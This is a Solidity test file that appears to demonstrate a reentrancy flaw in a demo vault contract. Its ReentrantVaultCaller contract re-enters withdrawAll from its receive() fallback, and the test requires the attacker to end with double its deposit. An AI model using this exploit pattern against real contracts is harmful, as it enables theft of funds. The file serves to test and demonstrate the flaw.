// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/ProofGuardDemoVault.sol";

contract ReentrantVaultCaller {
    ProofGuardDemoVault public immutable vault;
    uint256 public callbacks;

    constructor(ProofGuardDemoVault target) {
        vault = target;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdrawAll();
    }

    receive() external payable {
        callbacks += 1;
        if (callbacks == 1) {
            vault.withdrawAll();
        }
    }
}

contract ProofGuardReentrancyTest {
    receive() external payable {}

    function testReentrantWithdrawal() public {
        ProofGuardDemoVault vault = new ProofGuardDemoVault();
        vault.deposit{value: 2 ether}();

        ReentrantVaultCaller caller = new ReentrantVaultCaller(vault);
        caller.attack{value: 1 ether}();

        require(address(caller).balance == 2 ether, "reentrant payout not observed");
    }
}
